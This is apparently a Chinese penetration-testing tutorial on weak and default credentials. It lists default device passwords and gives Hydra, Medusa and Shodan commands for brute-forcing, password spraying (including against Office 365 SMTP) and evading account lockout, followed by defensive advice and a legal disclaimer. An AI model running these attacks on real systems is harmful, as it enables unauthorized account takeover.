---
title: 认证安全：弱口令与默认口令
date: 2024-09-28 06:28:32
tags:
  - 渗透测试
  - 认证安全
description: 认证安全——弱口令与默认口令、密码喷洒 vs 暴力破解与常见设备默认凭证。
categories: 渗透测试
---

## 引言

认证是信息系统的第一道防线。无论防火墙策略多么严密，一旦攻击者获取了合法凭证，防护便形同虚设。在渗透测试实战中，弱口令与默认口令依然是最可靠、成本最低的初始访问途径之一。本文系统梳理默认凭证数据库、弱口令规律、凭证攻击手法对比、锁定绕过技巧，并结合 Hydra 与 Medusa 给出可复现的示例。

## 默认凭证数据库

面对未知设备时应首先查阅默认凭证数据库，以下是业界常用的公开资源。

### DefaultCreds-cheat-sheet

[GitHub 仓库](https://github.com/ihebski/DefaultCreds-cheat-sheet) 维护数千条 CSV 记录，覆盖路由器、交换机、防火墙、打印机、IPMI、数据库等设备类型，字段包括 `vendor`、`product`、`protocol`、`username`、`password`：

```csv
vendor,product,protocol,username,password
Cisco,IOS,ssh,admin,admin
Hikvision,DS-2CD2xxx,http,admin,12345
Dell,iDRAC6,http,root,calvin
Oracle,WebLogic,http,weblogic,welcome1
```

### SecLists 默认凭证目录

[SecLists](https://github.com/danielmiessler/SecLists) 仓库中 `Passwords/Default-Credentials/` 分类细致，涵盖 `avaya_default_passwords.csv`、`scada-pass.csv`、`tomcat-betterdefaultpasslist.txt` 等子集，适合按行业和设备类型快速定位。

### 在线查询平台

- [CIRT.net](https://cirt.net/passwords) — 按厂商字母排序查询
- [DefaultPassword.com](https://default-password.info) — 按路由器型号检索
- [RouterPasswords.com](https://www.routerpasswords.com) — 专注家用路由器品牌

### RouterSploit

[RouterSploit](https://github.com/threat9/routersploit) 框架内置路由器漏洞利用模块，`routersploit/wordlists/` 目录提供按品牌分类的默认凭证，适合自动化路由器渗透。

### 合并去重生成自定义字典

```bash
cat default-passwords.csv avaya_default_passwords.csv \
  | cut -d',' -f3,4 | sort -u > merged-defaults.txt
```

## Top 1000 弱口令分析

以 Kali 自带的 `rockyou.txt`（约 1400 万条）为例，其前 1000 条揭示如下规律：

### 分类特征

**数字序列型：** `123456`、`123456789`、`12345`、`111111`、`000000`、`666666`

**键盘模式型：** `qwerty`、`qwerty123`、`asdfgh`、`zxcvbnm`、`1q2w3e4r`

**简单语义型：** `password`、`iloveyou`、`princess`、`monkey`、`dragon`、`shadow`

**中文用户常见弱口令：** `admin123`、`admin888`、`12345678`、`88888888`、`woaini`、`woaiwojia`、`5201314`

### 字典操作实用命令

```bash
head -n 1000 /usr/share/wordlists/rockyou.txt > top1000.txt

# 按长度过滤并去重
awk 'length($0) >= 6 && length($0) <= 16' rockyou.txt \
  | sort -u > rockyou-6to16.txt

# hashcat-utils 组合生成
combinator top1000.txt top1000.txt > combo-1M.txt
```

## Credential Stuffing vs. Password Spraying

两种攻击常被混淆，但其逻辑与适用场景截然不同。

### Credential Stuffing（凭证填充）

依赖用户跨站复用密码的习性，将已泄露的凭证对（`user:password`）直接向目标系统尝试。

- 一个用户名对应一个或极少数密码
- 高命中率依赖泄露数据质量
- 登录失败在用户名维度分散，触发锁定概率较低

```bash
# Hydra 凭证填充
hydra -C leaked_creds.txt ssh://192.168.1.100
# leaked_creds.txt 格式: username:password
```

### Password Spraying（密码喷洒）

假设大量用户中存在少数弱口令个体，用少量密码对全体用户各试一次。

- 一个密码对应大量用户名
- 每用户仅尝试一次，有效规避锁定策略
- 依靠广度覆盖而非深度爆破

```bash
# Hydra 密码喷洒
hydra -L users.txt -p 'Spring2026!' smtp.office365.com smtp

# 多密码依次喷洒，间隔 5 分钟以降低检测风险
while read -r pass; do
  hydra -L users.txt -p "$pass" smtp.office365.com smtp
  sleep 300
done < top_passwords.txt
```

### 对比总结

| 维度 | Credential Stuffing | Password Spraying |
|------|--------------------|--------------------|
| 输入 | 泄露凭据对 | 用户名列表 + 少量密码 |
| 每用户尝试次数 | 极少 | 极少 |
| 触发锁定风险 | 低 | 极低 |
| 成功率依赖 | 密码复用率 | 弱口令普遍性 |
| 典型目标 | B2C 服务 | 企业 AD/Azure AD/O365 |

## 账户锁定策略绕过

锁定策略（连续 N 次失败后锁定 M 分钟）是常见的爆破防御手段，但存在多种绕过途径。

### 绕过技术

**1. 低速爆破：** 将尝试间隔拉长到超过锁定窗口长度。

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100 \
  -t 1 -W 30 -c 60
# -t 1: 单任务  -W 30: 间隔30秒  -c 60: 每分钟全局连接上限
```

**2. 分布式来源 IP：** 通过代理池分散源 IP，使每个 IP 的尝试次数低于阈值。

```bash
medusa -h 192.168.1.100 -u admin -P top1000.txt \
  -M ssh -t 10 -O proxy_list.txt
```

**3. 利用不同协议端点：** 同一认证后端暴露在多个协议上——Web 端可能锁定但 IMAP/SMTP 未锁，主站有验证码但 API 端点没有。

```bash
# 多协议并行尝试，共享同一字典
medusa -h mail.target.com -U users.txt -P passwords.txt -M imap &
medusa -h mail.target.com -U users.txt -P passwords.txt -M smtp-vrfy &
medusa -h mail.target.com -U users.txt -P passwords.txt -M pop3 &
wait
```

**4. 先枚举用户名再审慎爆破：** 利用 Kerberos、SMTP VRFY、O365 时间侧信道等方式获取有效用户列表。

```bash
./kerbrute userenum -d target.local --dc 10.0.0.1 user_list.txt
smtp-user-enum -M VRFY -U names.txt -t mail.target.com
```

## 常见设备默认凭据

### 路由器和网络设备

| 厂商 | 默认用户名 | 默认密码 | 管理协议 |
|------|-----------|---------|---------|
| TP-Link | admin | admin | HTTP |
| Cisco | admin / cisco | admin / cisco | SSH/HTTP |
| MikroTik | admin | (空) | WinBox/SSH |
| Huawei | admin / root | admin / Admin@huawei | HTTP/SSH |
| Juniper | root | (空) / juniper123 | SSH |
| ZTE / Tenda | admin | admin | HTTP |
| Netgear | admin | password / admin | HTTP |

### 网络摄像头 (CCTV)

安防摄像头因长期在线且固件更新滞后，默认凭证问题最为严重。Hikvision 和 Dahua 占据全球过半份额，`admin:12345` 组合在 Shodan 上至今极为常见。

| 厂商 | 默认用户名 | 默认密码 |
|------|-----------|---------|
| Hikvision | admin | 12345 / admin12345 |
| Dahua | admin | admin |
| Axis | root | pass / admin |
| Vivotek / Foscam | admin | (空) |
| Uniview | admin | 123456 |
| Avigilon | admin | admin |

使用 Shodan CLI 与 Nmap 脚本进行探测：

```bash
shodan search 'Server: Hikvision-Webs country:CN' \
  --fields ip_str,port,org
nmap -p 80,554,8000 --script http-default-accounts \
  -iL camera_targets.txt -oA camera_scan
```

### IoT 与服务器管理

| 设备类型 | 常见默认凭据 |
|---------|-------------|
| Dell iDRAC | root:calvin |
| HP iLO | Administrator:admin 或随机 8 位 |
| Supermicro IPMI | ADMIN:ADMIN |
| QNAP / Synology NAS | admin:admin |
| HP / Ricoh / Canon 打印机 | admin:(空) 或 admin:admin |
| SCADA/PLC | 厂商硬编码，如 Schneider: USER:USER |

### 打印机专项

```bash
# PRET 工具测试打印机安全
python pret.py 192.168.1.50 pjl

# 使用 ipmitool 验证 IPMI 默认凭据
ipmitool -H 10.0.0.10 -U ADMIN -P ADMIN chassis status
```

## Hydra 实战

[Hydra](https://github.com/vanhauser-thc/thc-hydra) 是最经典的多协议在线爆破工具。

### 基础协议示例

```bash
# SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# FTP
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# HTTP POST 表单
hydra -l admin -P top1000.txt 192.168.1.100 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Login failed"

# HTTP Basic Auth
hydra -l admin -P top1000.txt http-get://192.168.1.100/admin
```

### 高级用法

```bash
# CSRF Token 动态提取
hydra -l admin -P top1000.txt 192.168.1.100 http-post-form \
  "/login:user=^USER^&pass=^PASS^&csrf=^C^:Invalid:C=Set-Cookie: csrf_token=([^;]+)"

# RDP / MySQL / SMB
hydra -l administrator -P passwords.txt rdp://192.168.1.100
hydra -l root -P passwords.txt mysql://192.168.1.100
hydra -l Administrator -P passwords.txt smb://192.168.1.100

# 批量目标 + 找到即停
hydra -L users.txt -P passwords.txt -M targets.txt ssh \
  -t 4 -o results.txt -f

# 断点续传
hydra -R
```

## Medusa 实战

[Medusa](https://github.com/jmk-foofus/medusa) 强调并行性和稳定性，适合大规模分布式爆破。

### 基本用法

```bash
# SSH 爆破
medusa -h 192.168.1.100 -u root -P /usr/share/wordlists/rockyou.txt -M ssh

# 指定端口与线程
medusa -h 192.168.1.100 -u admin -P top1000.txt -M ssh -n 2222 -t 10

# 用户名密码组合文件
medusa -h 192.168.1.100 -C combo.txt -M ssh
```

### HTTP 与批量

```bash
# HTTP POST 表单
medusa -h 192.168.1.100 -u admin -P top1000.txt -M web-form \
  -m FORM:"path=/login.php&user=USER&pass=PASS&submit=Login" \
  -m DENY-SIGNAL:"Login failed"

# 批量目标
medusa -H targets.txt -u admin -P passwords.txt -M ssh -t 4

# 查看所有支持模块及参数
medusa -d && medusa -M ssh -q
```

### 工具选择建议

| 场景 | 推荐 | 原因 |
|------|-----|------|
| 简单快速单目标爆破 | Hydra | 语法简洁 |
| 大规模分布式爆破 | Medusa | 并行模型更优 |
| HTTP 含 CSRF 的复杂表单 | Hydra | 内置 Token 提取引擎 |
| 嵌入式设备资源受限环境 | Medusa | 内存占用更小 |

## 防御建议

### 技术措施

1. **禁止默认凭据上线** —— 强制首次启动修改密码。
2. **启用多因素认证（MFA）** —— 即使密码泄露仍可阻断未授权访问。
3. **强密码策略** —— 对接 `haveibeenpwned.com` API 过滤已知泄露密码。
4. **智能锁定** —— 渐进延迟 + CAPTCHA 替代简单 N 次失败锁定。
5. **收敛攻击面** —— 管理接口不外露公网，通过 VPN 或堡垒机访问。
6. **日志 SIEM 告警** —— 建立异常基线（如单 IP 跨多用户认证）。

### 针对供应链与资产

- 供应商合同中写入交付前清除默认凭据条款。
- 持续资产发现，扫描网络中新增或遗忘的 IoT 设备。

### 防御自查命令

```bash
# CrackMapExec 批量验证 SMB 弱口令
crackmapexec smb 10.0.0.0/24 -u users.txt \
  -p passwords.txt --continue-on-success

# BloodHound 发现特权路径
bloodhound-python -d domain.local -u user \
  -p pass -ns 10.0.0.10 -c All
```

## 免责声明

> 本文所述技术仅限以下合法场景使用：
>
> 1. 对自有系统进行授权安全评估；
> 2. 获得客户书面授权的渗透测试项目；
> 3. 教育及学术研究目的。
>
> **任何未经授权对他人信息系统进行密码爆破、凭证测试或访问的行为均属违法**，可能触犯《中华人民共和国刑法》第二百八十五条、第二百八十六条以及《中华人民共和国网络安全法》相关规定。读者须对自身行为负全部法律责任，作者不承担任何因误用本文信息导致的法律后果。
>
> 在渗透测试中，建议在合同范围内明确约定认证测试的边界与协议，避免在生产高峰期执行大规模爆破。对云租户身份系统（Azure AD、Okta）的测试须事先取得平台方书面许可。

## 参考资源

- [DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [SecLists - Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)
- [Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Medusa GitHub](https://github.com/jmk-foofus/medusa)
- [RouterSploit](https://github.com/threat9/routersploit)
- [CIRT.net Default Passwords](https://cirt.net/passwords)
- [OWASP Credential Stuffing Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html)
